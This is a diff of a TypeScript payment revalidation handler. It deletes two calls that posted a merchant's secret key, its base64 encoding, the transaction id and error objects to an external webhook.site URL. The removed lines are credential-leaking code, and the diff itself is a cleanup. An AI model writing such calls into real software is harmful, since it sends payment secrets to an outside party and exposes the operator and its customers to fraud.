@@ -454,7 +454,6 @@ const revalidatePayment = async (req: Request, res: Response) => {
 
 		if (!payment) return errorResponse(res, `Payment log with transRef ${id} not found!`);
 		const encondedRef = Buffer.from(payment.mda.secretKey).toString('base64');
-		await axios.post('https://webhook.site/90dbae2a-6939-4b97-8b3c-fcd9fbd0c72c', { secretKey: payment.mda.secretKey, encondedRef, id });
 		// console.log('revalidation response ', payment.mda.dataValues)
 		const fpResp = await fpAxios.get(`/checkout/revalidate-payment/${id}`, {
 			headers: {
@@ -482,7 +481,6 @@ const revalidatePayment = async (req: Request, res: Response) => {
 		return successResponse(res, `Payment successfully logged`, updatedPayment);
 	} catch (error) {
 		// console.log('err ', error)
-		await axios.post('https://webhook.site/90dbae2a-6939-4b97-8b3c-fcd9fbd0c72c', { error });
 		return errorResponse(res, `An error occurred - ${error}`);
 	}
 };
